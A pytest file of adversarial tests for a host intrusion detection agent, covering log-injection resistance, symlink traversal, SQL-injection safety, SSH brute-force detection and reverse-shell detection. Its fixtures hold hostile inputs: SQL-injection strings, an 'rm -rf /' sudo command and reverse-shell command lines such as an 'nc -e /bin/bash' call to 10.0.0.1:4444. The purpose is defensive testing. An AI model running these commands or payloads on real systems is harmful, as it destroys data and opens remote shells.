"""Security adversarial tests for HIDS agent."""

from pathlib import Path

import pytest

from hids.collectors.auth_log import AuthLogParser
from hids.collectors.fim import FileIntegrityScanner
from hids.collectors.process import ProcessMonitor
from hids.db.database import DatabaseManager
from hids.engine.detector import DetectionEngine
from hids.models.telemetry import ProcessRecord


def test_adversarial_log_injection_resistance() -> None:
    """Ensure malicious forged syslog lines do not crash parser or trigger loops."""
    parser = AuthLogParser()

    malicious_inputs = [
        (
            "Oct 11 12:00:00 host sshd[123]: Failed password for root "
            "from 1.2.3.4\nDROP TABLE host_events;-- port 22 ssh2"
        ),
        (
            "Oct 11 12:00:00 host sshd[123]: Failed password for invalid user "
            "' OR '1'='1 from 999.999.999.999 port 22"
        ),
        (
            "Oct 11 12:00:00 host sudo:   attacker : TTY=pts/0 ; PWD=/ ; "
            "USER=root ; COMMAND=/bin/sh -c 'rm -rf /'"
        ),
        "\x00\x01\x02binary junk log injection attempt",
        "A" * 10000,  # Buffer overflow attempt
    ]

    for line in malicious_inputs:
        record = parser.parse_line(line)
        # Should cleanly return None or parsed record without exception
        if record:
            assert isinstance(record.raw_log, str)


def test_adversarial_path_traversal_fim(tmp_path: Path) -> None:
    """Ensure FIM scanner handles symlinks and traversal attempts safely."""
    scanner = FileIntegrityScanner()

    # Create dummy dir with symlink pointing out
    work_dir = tmp_path / "sandbox"
    work_dir.mkdir()
    real_file = work_dir / "legit.txt"
    real_file.write_text("safe content", encoding="utf-8")

    link_file = work_dir / "escape_link"
    try:
        link_file.symlink_to(Path("/etc/hosts"))
    except OSError:
        pytest.skip("Symlink creation not permitted in test environment")

    # Scanner should scan directory without following circular loops or crashing
    baseline = scanner.scan_directory(work_dir)
    assert len(baseline) >= 1
    assert str(real_file) in baseline


def test_adversarial_database_sql_injection_defense(tmp_path: Path) -> None:
    """Ensure SQL injection attempts in telemetry details are safely parameterized."""
    db_file = tmp_path / "sql_test.db"
    db = DatabaseManager(db_file)
    db.init_db()

    # Malicious process record
    engine = DetectionEngine()
    malicious_proc = ProcessRecord(
        pid=666,
        name="evil_proc'); DROP TABLE alerts; --",
        exe_path="/tmp/evil'; DROP TABLE host_events; --",
        cmdline=["/tmp/evil", "'; DROP TABLE fim_baselines; --"],
        username="hacker' OR 1=1; --",
    )

    monitor = ProcessMonitor()
    anomalies = monitor.analyze_process(
        {
            "pid": malicious_proc.pid,
            "name": malicious_proc.name,
            "exe": malicious_proc.exe_path,
            "cmdline": malicious_proc.cmdline,
        }
    )
    assert len(anomalies) >= 1
    event = monitor.create_host_event(malicious_proc, anomalies[0])

    db.save_event(event)
    alerts = engine.evaluate_event(event)
    for alert in alerts:
        db.save_alert(alert)

    # Verify tables still exist and are intact
    events = db.list_events()
    assert len(events) == 1
    assert "DROP TABLE" in events[0].details["name"]


def test_adversarial_rate_limiting_and_memory_exhaustion() -> None:
    """Verify that brute-force detection handles high volume without crashing."""
    records = []
    # 50 failed attempts from 198.51.100.99
    for i in range(50):
        raw = (
            f"Oct 11 15:00:{i % 60:02d} web01 sshd[{1000 + i}]: "
            f"Failed password for root from 198.51.100.99 port {50000 + i} ssh2"
        )
        rec = AuthLogParser.parse_line(raw, reference_year=2026)
        if rec:
            records.append(rec)

    attacks = AuthLogParser.detect_ssh_brute_force(records, threshold=5, window_seconds=120)
    assert len(attacks) == 1
    assert attacks[0]["source_ip"] == "198.51.100.99"
    assert attacks[0]["failed_attempts"] == 50


def test_reverse_shell_heuristic_adversarial_obfuscation() -> None:
    """Verify detection of various obfuscated reverse shells spawned by web workers."""
    monitor = ProcessMonitor()

    # Simulated obfuscated web reverse shells
    test_cases = [
        {
            "pid": 1001,
            "name": "sh",
            "ppid_name": "nginx",
            "exe": "/bin/sh",
            "cmdline": ["sh", "-i"],
        },
        {
            "pid": 1002,
            "name": "python3",
            "ppid_name": "apache2",
            "exe": "/usr/bin/python3",
            "cmdline": ["python3", "-c", "import socket,subprocess,os;s=socket.socket()..."],
        },
        {
            "pid": 1003,
            "name": "nc",
            "ppid_name": "nginx",
            "exe": "/bin/nc",
            "cmdline": ["nc", "-e", "/bin/bash", "10.0.0.1", "4444"],
        },
    ]

    for proc_dict in test_cases:
        anomalies = monitor.analyze_process(proc_dict)
        types = [a.anomaly_type for a in anomalies]
        assert "UNAUTHORIZED_CHILD_SHELL" in types or "REVERSE_SHELL_DETECTED" in types
